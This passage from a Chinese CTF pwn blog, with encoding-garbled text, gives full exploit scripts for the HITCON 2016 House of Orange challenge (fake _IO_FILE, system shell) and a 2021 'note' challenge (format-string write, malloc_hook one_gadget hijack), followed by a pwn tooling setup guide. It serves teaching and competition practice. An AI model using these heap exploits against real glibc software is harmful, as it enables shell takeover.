<p>å¯ä»¥çœ‹åˆ°top chunk çš„sizeä¸º0x21f81,<br>è€Œç»è¿‡IDAåˆ†ææˆ‘ä»¬æœ€å¤§å¯ä»¥ç”³è¯·å¤§å°ä¸º0x1000å¤§å°çš„å †å—,<br>å¯ä»¥åˆ©ç”¨å †æº¢å‡ºæ¥ä¿®æ”¹sizeä½ä¸º0xf81,æ„é€ å¦‚ä¸‹payload<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">build(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xf81</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure></p>
<h4 id="Step2-unsorted-bin-attack-æ³„éœ²åœ°å€"><a href="#Step2-unsorted-bin-attack-æ³„éœ²åœ°å€" class="headerlink" title="Step2 unsorted bin attack æ³„éœ²åœ°å€"></a>Step2 unsorted bin attack æ³„éœ²åœ°å€</h4><p>æ¥ä¸‹æ¥ç”³è¯·ä¸€ä¸ªå¤§äºtop chunkçš„chunkçš„åˆ°unsorted bin<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">build(<span class="number">0x1000</span>,<span class="string">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure><br><img src="http://static.zybuluo.com/hgggg/bgduyroukjb5oux25dfmyqvl/14.png" alt="14.png-64.1kB"><br>å¯çœ‹åˆ°æˆ‘ä»¬çš„åˆ°äº†ä¸€ä¸ªunsorted binå¹¶ä¸”å…¶fd å’Œ bkæŒ‡é’ˆå‡æŒ‡å‘main_arena_88çš„ä½ç½®<br>æ¥ä¸‹æ¥å°±æ˜¯çš„åˆ°unsorted bin ç”³è¯·chunk æ¥ libc_base å’Œ heap_addr äº†<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">build(<span class="number">0x400</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Name of house : &#x27;</span>)</span><br><span class="line">main_arena_88 = u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = main_arena_88 - <span class="number">0x3c5163</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ³„éœ²å †åœ°å€</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap_addr - <span class="number">0xE0</span></span><br></pre></td></tr></table></figure></p>
<h4 id="Step3-ä¼ªé€ -IO-FILEç»“æ„ä½“"><a href="#Step3-ä¼ªé€ -IO-FILEç»“æ„ä½“" class="headerlink" title="Step3 ä¼ªé€ _IO_FILEç»“æ„ä½“"></a>Step3 ä¼ªé€ _IO_FILEç»“æ„ä½“</h4><p><img src="http://static.zybuluo.com/hgggg/8v00ux1tq8602vb38j6t6ju0/15.png" alt="15.png-91.7kB"><br><img src="http://static.zybuluo.com/hgggg/m21uqe95v4smhqlw49ggw41g/16.png" alt="16.png-69.2kB"></p>
<p>æˆ‘ä»¬éœ€è¦å°†_IO_FIlEæŒ‰ç…§å‰é¢æ€»ç»“çš„æ–¹å¼ä¼ªé€ ï¼Œ<br>å½“è§¦å‘mallocæ—¶ï¼Œglibcä¼šæ•´ç†unsorted binï¼ŒæŠŠå¯¹åº”sizeçš„chunkæ”¾å…¥smallbiné‡Œé¢<br>ç”±äºæˆ‘ä»¬ç”³è¯·çš„chunkä¸å’Œæ³•ï¼Œä¼šè§¦å‘malloc_printerr ï¼Œéšå_IO_flush_all_lockpä¼šä»_IO_list_allæŒ‡å‘çš„FILEç»“æ„å¼€å§‹æŸ¥æ‰¾ï¼Œæ‰¾åˆ°åˆé€‚_IO_FILEä½œä¸º_IO_OVERFLOWçš„å‚æ•°ï¼Œæ‰§è¡Œvtableé‡Œé¢çš„å‡½æ•°ï¼ŒæŠŠIO_FILEç»“æ„ä½“æœ¬èº«ä½œä¸ºå‚æ•°<br>è¿™æ—¶æˆ‘ä»¬åªè¦å°†__overflowè¦†ç›–æˆsystemï¼Œå¹¶åœ¨fake_IO_FILEä¸­å†™å…¥/bin/shåšä¸ºå‚æ•°å°±èƒ½getshell<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x60</span>) <span class="comment">#_IO_read_ptr = 0x60 (small bin [4])</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all_addr-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) +p64(<span class="number">0</span>) </span><br><span class="line">fake_file += p64(heap_base+<span class="number">0x5E8</span>)<span class="comment">#vtableæŒ‡é’ˆ,åŒæ—¶ï¼Œä¹Ÿä½œä¸ºfake_vtableçš„__dummy è¿™é‡Œçš„0x5E8=0x510+0xC0+0x18</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">2</span> <span class="comment">#__dummy2ã€__finish</span></span><br><span class="line">fake_file += p64(system_addr)<span class="comment">#è¦†ç›–__overflow</span></span><br><span class="line">payload += fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment">#è§¦å‘malloc</span></span><br></pre></td></tr></table></figure><br>ä¸‹é¢æ˜¯è§¦å‘mallocå_IO_FILEçš„æƒ…å†µ<br><img src="http://static.zybuluo.com/hgggg/ml2vafj9lvudw6idwgn4yxj8/17.png" alt="17.png-161.9kB"><br><img src="http://static.zybuluo.com/hgggg/dbljk3vs6nsagkwu9xo0jnne/18.png" alt="18.png-99.2kB"><br><img src="http://static.zybuluo.com/hgggg/q3w0yq81kitpr4og8h94bmpm/19.png" alt="19.png-56kB"><br>æˆåŠŸget shell</p>
<h4 id="å®Œæ•´exp"><a href="#å®Œæ•´exp" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,25967)</span></span><br><span class="line">p = process(<span class="string">&#x27;/home/hgg/Desktop/houseoforange_hitcon_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;/home/hgg/Desktop/houseoforange_hitcon_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;199&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;120&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">build(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf81</span>)</span><br><span class="line">update(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">build(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">build(<span class="number">0x400</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name of house : &quot;</span>)</span><br><span class="line">main_arena_88 = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = main_arena_88 - <span class="number">0x3c5163</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line">update(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = heap_addr - <span class="number">0xe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+ p64(<span class="number">0x60</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload1.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heap_base + <span class="number">0x5E8</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload1 += p64(system_addr)</span><br><span class="line">payload = payload+payload1</span><br><span class="line">update(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ç¥¥äº‘æ¯2021-note"><a href="#ç¥¥äº‘æ¯2021-note" class="headerlink" title="ç¥¥äº‘æ¯2021_note"></a>ç¥¥äº‘æ¯2021_note</h3><h4 id="IDAåˆ†æ-1"><a href="#IDAåˆ†æ-1" class="headerlink" title="IDAåˆ†æ"></a>IDAåˆ†æ</h4><p>add</p>
<p><img src="http://static.zybuluo.com/hgggg/utb61irhn7pfb8divn1r5gcm/20.png" alt="20.png-47kB"></p>
<p>say<br><img src="http://static.zybuluo.com/hgggg/myib49627xjbzmxixn6uh05q/21.png" alt="21.png-27.8kB"></p>
<p>show<br><img src="http://static.zybuluo.com/hgggg/6vla2w4fpv4bnyi7a9oekzn9/22.png" alt="22.png-19.7kB"></p>
<h4 id="Step1æ³„éœ²å †åœ°å€"><a href="#Step1æ³„éœ²å †åœ°å€" class="headerlink" title="Step1æ³„éœ²å †åœ°å€"></a>Step1æ³„éœ²å †åœ°å€</h4><p><del>è¿™ä¸ªä¸éš¾ï¼Œæœ‰æ‰‹å°±è¡Œ</del>ï¼Œç›´æ¥ä¸Šä»£ç <br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;addr: &quot;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure></p>
<h4 id="Step2-house-of-orangeå¾—åˆ°unsorted-bin"><a href="#Step2-house-of-orangeå¾—åˆ°unsorted-bin" class="headerlink" title="Step2 house of orangeå¾—åˆ°unsorted bin"></a>Step2 house of orangeå¾—åˆ°unsorted bin</h4><p>å‰é¢æˆ‘ä»¬é€šè¿‡å †æº¢å‡ºæ¥ä¿®æ”¹top chunk çš„size ï¼Œä½†æ˜¯è¿™é“é¢˜ä¸è¡Œ<br>è¿™é“é¢˜éœ€è¦ç”¨ï¼Œscanfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥ä¿®æ”¹æ•°æ®<br>ä¸€èˆ¬æ¥è¯´scanf(â€œ%dâ€,&amp;a),%dæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œ&amp;aæ˜¯å‚æ•°ï¼Œscanfçš„å‰5ä¸ªå‚æ•°éƒ½æ˜¯ç”±å¯„å­˜å™¨å‚¨å­˜çš„ï¼Œä»ç¬¬6ä¸ªå¼€å§‹å‚¨å­˜åœ¨æ ˆä¸Š<br>æ‰€ä»¥æˆ‘ä»¬æ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸² %7$s.ljust(8,â€™\x00â€™) (åŸå› æ˜¯æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼šæ”¾ç½®æˆ‘ä»¬çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°åˆ™ä¼šå»ä½œä¸ºæˆ‘ä»¬ä»»æ„åœ°å€å†™çš„å‚æ•°)<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">top_chunk = heap_addr + <span class="number">0x40</span></span><br><span class="line">top_size = top_chunk + <span class="number">8</span></span><br><span class="line">say(<span class="string">b&#x27;%7$daaaa&#x27;</span>+p64(top_size),<span class="built_in">str</span>(<span class="number">0xfb1</span>))</span><br></pre></td></tr></table></figure><br><img src="http://static.zybuluo.com/hgggg/70yvps4st5g58xgbznkad2rl/23.png" alt="23.png-19.5kB"><br>å¯ä»¥çœ‹åˆ°top chunk å·²ç»è¢«æˆäº†ä¼ªé€ 0xfb1<br>æ¥ä¸‹æ¥åªè¦æˆ‘ä»¬è¿ç»­ç”³è¯·chunkå°±èƒ½å¾—åˆ°unsorted bin æ¥leak libcäº†<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = libc_addr - <span class="number">0x3C4C61</span></span><br></pre></td></tr></table></figure><br><img src="http://static.zybuluo.com/hgggg/2lsotbhov1sfzdv9d462p2es/24.png" alt="24.png-66kB"></p>
<h4 id="Step3-malloc-hook-åŠ«æŒä¸º-realloc-ï¼Œrealloc-hook-åŠ«æŒä¸º-onegadget-æ¥-get-shell"><a href="#Step3-malloc-hook-åŠ«æŒä¸º-realloc-ï¼Œrealloc-hook-åŠ«æŒä¸º-onegadget-æ¥-get-shell" class="headerlink" title="Step3  malloc_hook åŠ«æŒä¸º realloc ï¼Œrealloc_hook åŠ«æŒä¸º onegadget æ¥ get shell"></a>Step3  malloc_hook åŠ«æŒä¸º realloc ï¼Œrealloc_hook åŠ«æŒä¸º onegadget æ¥ get shell</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadgets = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">one = libc_base + one_gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">say(<span class="string">b&#x27;%7$saaaa&#x27;</span>+p64(malloc_hook-<span class="number">8</span>),p64(one)+p64(realloc+<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="åæ€"><a href="#åæ€" class="headerlink" title="åæ€"></a>åæ€</h2><p>ä¸Šè¿°çš„åˆ©ç”¨æ–¹å¼ä»…ä»…åªæ˜¯å¯¹glibc2.23åŠä»¥ä¸‹ç‰ˆæœ¬æœ‰æ•ˆ<br>åœ¨glibc2.24 - 2.26 ä¹‹é—´å¢åŠ äº†å¯¹vtableåˆæ³•æ€§çš„æ£€æŸ¥ï¼Œå³è™šè¡¨çš„åœ°å€å¿…é¡»åœ¨<strong>start</strong>libc_IO_vatbales å’Œ <strong>stop</strong>libc_IO_vtablesä¹‹é—´<br>bypassæ€è·¯ï¼š__overflow-&gt;_IO_strn_jump-&gt;_IO_str_finish(_IO_FILE+0x38 = /bin/sh , _IO_FIE+0Xe8 = system)</p>
<pre><code>1.fp-&gt;mode = 0
2._IO_write_ptr &lt; _IO_write_base
3._IO_read_ptr = 0x60 (small bin [4])
4._IO_read_base = _IO_list_all - 0x10 (unsorted bin bk)
5.vtable = _IO_str_jump - 8 
6.byte(fp-&gt;flags) = 0
7.fp -&gt; _IO_buf_base = /bin/sh
8.fp -&gt; 0xe8 = system
</code></pre><p>åœ¨glibc2.27ä¹‹ååˆ™æ˜¯å»æ‰äº†abort()ä¸­çš„fflush(NULL)ä½¿å¾—è¯¥æ¼æ´æ— æ³•å¾—åˆ°åˆ©ç”¨</p>
<p>P.S. åœ¨ä¼ªé€ top chunkæ—¶è¦æ³¨æ„åˆæ³•æ€§</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.bilibili.com/video/BV1Uv411j7fr?p=28">https://www.bilibili.com/video/BV1Uv411j7fr?p=28</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzkxMTI2NTQ0NA==&amp;mid=2247483912&amp;idx=5&amp;sn=08530a5ac5dd9b87ca43d9abff3939de&amp;chksm=c11f99c3f66810d53cdec65944e86e59af183102337f0f35b284ccb19456bee99df8cbe02255&amp;mpshare=1&amp;scene=23&amp;srcid=08265eMSjEXjdjMfogEOv6UO&amp;sharer_sharetime=1629949810901&amp;sharer_shareid=e6354a0018f4b85eab5b69e4a2130a22#rd">https://mp.weixin.qq.com/s?__biz=MzkxMTI2NTQ0NA==&amp;mid=2247483912&amp;idx=5&amp;sn=08530a5ac5dd9b87ca43d9abff3939de&amp;chksm=c11f99c3f66810d53cdec65944e86e59af183102337f0f35b284ccb19456bee99df8cbe02255&amp;mpshare=1&amp;scene=23&amp;srcid=08265eMSjEXjdjMfogEOv6UO&amp;sharer_sharetime=1629949810901&amp;sharer_shareid=e6354a0018f4b85eab5b69e4a2130a22#rd</a><br><a href="https://www.cnblogs.com/hetianlab/p/13884739.html">https://www.cnblogs.com/hetianlab/p/13884739.html</a><br><a href="https://blog.csdn.net/seaaseesa/article/details/104314949">https://blog.csdn.net/seaaseesa/article/details/104314949</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnç¬”è®°</tag>
        <tag>glibcå †</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnå…¥é—¨ä¹‹ç¯å¢ƒæ­å»º</title>
    <url>/2021/10/04/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/30.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="å·¥å…·"><a class="header-anchor" href="#å·¥å…·">Â¶</a>å·¥å…·</h2>
<p>VMware15</p>
<p>unbuntu20.0é•œåƒ ä¸‹è½½åœ°å€ï¼š</p>
<pre><code>http://mirrors.163.com/ubuntu-releases/20.04/
</code></pre>
<p>è¯¦æƒ…è¯·è§https://blog.csdn.net/weixin_44169941/article/details/109263134</p>
<h2 id="pwnç¯å¢ƒæ­å»º"><a class="header-anchor" href="#pwnç¯å¢ƒæ­å»º">Â¶</a>pwnç¯å¢ƒæ­å»º</h2>
<h3 id="å®‰è£…vscode"><a class="header-anchor" href="#å®‰è£…vscode">Â¶</a>å®‰è£…vscode</h3>
<pre><code>ç›´æ¥åœ¨Ubuntu software å®‰è£…å°±è¡Œ
</code></pre>
<h3 id="å®‰è£…gcc"><a class="header-anchor" href="#å®‰è£…gcc">Â¶</a>å®‰è£…gcc</h3>
<pre><code>sudo apt install gcc
gcc --version  
</code></pre>
<h3 id="é…ç½®32ä½ç¯å¢ƒ"><a class="header-anchor" href="#é…ç½®32ä½ç¯å¢ƒ">Â¶</a>é…ç½®32ä½ç¯å¢ƒ</h3>
<pre><code>sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt install build-essential
sudo apt install gcc-multilib
</code></pre>
<h3 id="å®‰è£…vim"><a class="header-anchor" href="#å®‰è£…vim">Â¶</a>å®‰è£…vim</h3>
<pre><code>sudo apt install vim
</code></pre>
<h3 id="å®‰è£…git"><a class="header-anchor" href="#å®‰è£…git">Â¶</a>å®‰è£…git</h3>
<pre><code>sudo apt install git
</code></pre>
<h3 id="å®‰è£…pwntools"><a class="header-anchor" href="#å®‰è£…pwntools">Â¶</a>å®‰è£…pwntools</h3>
<pre><code>sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
sudo python3 -m pip install --upgrade pip
sudo python3 -m pip install --upgrade pwntools
</code></pre>
<h3 id="å®‰è£…pwndbg-pwngdb-è”åˆè°ƒè¯•ç¯å¢ƒ"><a class="header-anchor" href="#å®‰è£…pwndbg-pwngdb-è”åˆè°ƒè¯•ç¯å¢ƒ">Â¶</a>å®‰è£…pwndbg + pwngdb è”åˆè°ƒè¯•ç¯å¢ƒ</h3>
<p>pwngdb</p>
<pre><code>cd ~/
git clone https://github.com/scwuaptx/Pwngdb.git 
cp ~/Pwngdb/.gdbinit ~/
</code></pre>
<p>pwndbg</p>
<pre><code>git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
</code></pre>
<p>è”åˆä½¿ç”¨</p>
<pre><code>vim ~/.gdbinit
æ³¨é‡Šæ‰ç¬¬ä¸€è¡Œ ç„¶ååœ¨ç¬¬äºŒè¡Œå†™å…¥
source ~/pwndbg/gdbinit.py
</code></pre>
<p>é£Ÿç”¨æ–¹æ³•æ±‡æ€»ï¼ˆæŒç»­ï¼‰</p>
<pre><code>1.å¸¦æºç è°ƒè¯•: gdb -q [file] -d [path]ï¼ˆé»˜è®¤ä¸º.ï¼‰
2.ä¸‹æ–­ç‚¹: b address
3.è¿è¡Œ: r
4.ç»§ç»­: c
5.è¿è¡Œä¸‹ä¸€æ­¥: ni
6.æ‰“å°é“¾æ¥åº“: vmmap
7.è¾“å‡ºlibc_base: libc
8.æŸ¥çœ‹å †: heapï¼Œparseheap
9.æŸ¥çœ‹bins: bin
10.æŸ¥çœ‹addresså¤„çš„å†…å­˜ x /nxg adress
11.æ‰“å°åœ°å€/æŒ‡é’ˆï¼šp address
12.æŸ¥çœ‹æ ˆï¼šstack length
13.æŸ¥çœ‹åœ°å€ï¼štelescoope address
14.æŸ¥çœ‹hex: hex address
15.æ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»åœ°å€: fmtarg 
</code></pre>
<h3 id="å®‰è£…docker"><a class="header-anchor" href="#å®‰è£…docker">Â¶</a>å®‰è£…docker</h3>
<pre><code>sudo apt install docker.io
</code></pre>
<h3 id="å®‰è£…seccomp-tools"><a class="header-anchor" href="#å®‰è£…seccomp-tools">Â¶</a>å®‰è£…seccomp-tools</h3>
<pre><code>sudo apt install gcc ruby-dev
gem install seccomp-tools
</code></pre>
<h3 id="å®‰è£…one-gadget"><a class="header-anchor" href="#å®‰è£…one-gadget">Â¶</a>å®‰è£…one_gadget</h3>
<pre><code>sudo gem install one_gadget
</code></pre>
<h3 id="å®‰è£…LibcSearcher"><a class="header-anchor" href="#å®‰è£…LibcSearcher">Â¶</a>å®‰è£…LibcSearcher</h3>
<pre><code>sudo pip3 install LibcSearcher
sudo pip3 install -U LibcSearcher
</code></pre>
<h3 id="å®‰è£…main-arena-offset"><a class="header-anchor" href="#å®‰è£…main-arena-offset">Â¶</a>å®‰è£…main_arena_offset</h3>
<pre><code>git clone https://github.com/dev2ero/py_main_arena_offset.git
cd py_main_arena_offset
sudo python3 setup.py develop
</code></pre>
<p>é£Ÿç”¨æ–¹æ³•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pymao <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">main_arena_offset = gmao( libc )</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_offset))</span><br></pre></td></tr></table></figure>
<h3 id="å®‰è£…æœ¬åœ°è°ƒè¯•ä¸åŒç‰ˆæœ¬çš„libcç¯å¢ƒ"><a class="header-anchor" href="#å®‰è£…æœ¬åœ°è°ƒè¯•ä¸åŒç‰ˆæœ¬çš„libcç¯å¢ƒ">Â¶</a>å®‰è£…æœ¬åœ°è°ƒè¯•ä¸åŒç‰ˆæœ¬çš„libcç¯å¢ƒ</h3>
<p>glibc-all-in-one</p>
<pre><code>git clone https://github.com/matrix1001/glibc-all-in-one.git
cd glibc-all-in-one
python3 update_list
cat list
 ./download [libc-version]
</code></pre>
<p>patchelf</p>
<pre><code>git clone https://github.com/NixOS/patchelf.git
cd patchelf
sudo apt-get install autoconf automake libtool
./bootstrap.sh
./configure
make
sudo make install
</code></pre>
<p>é£Ÿç”¨æ–¹æ³•</p>
<pre><code>patchelf --replace-needed libc.so.6 [your-libc-path] [yourelf]
patchelf --set-interpreter [libc-ld-path] [elf]
cp -r ~/Desktop/glibc-all-in-one/libs/[libcfolderpath]/.debug/ ./debug
gdb [elf]
# set debug-file-directory ./debug/
å¦‚æœè¦debugä¸åŒç‰ˆæœ¬çš„libcçš„ç¨‹åºå…·ä½“å¯ä»¥çœ‹è¿™ç¯‡åšå®¢ï¼šhttps://bbs.pediy.com/thread-254868.htm
